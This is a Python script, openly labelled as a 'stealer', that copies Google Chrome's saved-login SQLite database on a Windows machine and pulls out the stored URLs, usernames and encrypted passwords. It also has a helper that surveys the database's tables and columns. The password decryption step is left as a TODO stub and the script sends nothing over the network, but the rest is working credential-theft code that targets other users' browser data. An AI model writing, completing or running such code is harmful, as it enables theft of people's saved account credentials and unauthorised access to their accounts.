import os
import sqlite3
from shutil import copyfile

CHROME_PATH = os.getenv('localappdata') + r"\Google\Chrome\User Data\Default"
ORIGINAL_DB_PATH = CHROME_PATH + r'\Login Data'
DB_PATH = CHROME_PATH + r'\db'


def sql_access():
    """ Returns a SQLite3 connection to a copy of the credentials database """
    # Copy original sqlite3 database to access it without killing active Chrome processes
    copyfile(ORIGINAL_DB_PATH, DB_PATH)

    # Return connection
    db_connection = sqlite3.connect(DB_PATH)
    return db_connection


def extract_credentials(db_connection):
    """ Extracts user credentials from a SQLite3 connection """
    cursor = db_connection.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    data = cursor.fetchall()
    return data


def decrypt_passwords(data):
    """ Decrypts the encrypted passwords from data """
    # return dictionary of dictionaries - easy json
    extracted_data = []
    for url, username, encrypted_password in data:
        # TODO: decrypt password
        decrypted_password = encrypted_password
        extracted_data.append({
            'url': url,
            'username': username,
            'password': decrypted_password,
        })
    return extracted_data


def sqli_recon(db_connection):
    """ SQL queries to learn more about the database structure """
    # To find tables
    cursor = db_connection.cursor()
    cursor.execute('SELECT name FROM sqlite_master WHERE type="table"')
    print(cursor.fetchall())
    # Table of interest: logins

    # To find columns for logins table
    cursor.execute('PRAGMA table_info(logins)')
    print(cursor.fetchall())
    # Columns of interest: action_url, username_value, password_value


def windows_stealer():
    """ Steals Chrome Credentials from a Windows machine """
    # Access SQL Database
    db_connection = sql_access()

    # SQL recon
    # sqli_recon(db_connection)

    # Extract credentials
    data = extract_credentials(db_connection)

    # Decrypt passwords
    decrypt_passwords(data)

    # delete temp file?


if __name__ == '__main__':
    windows_stealer()
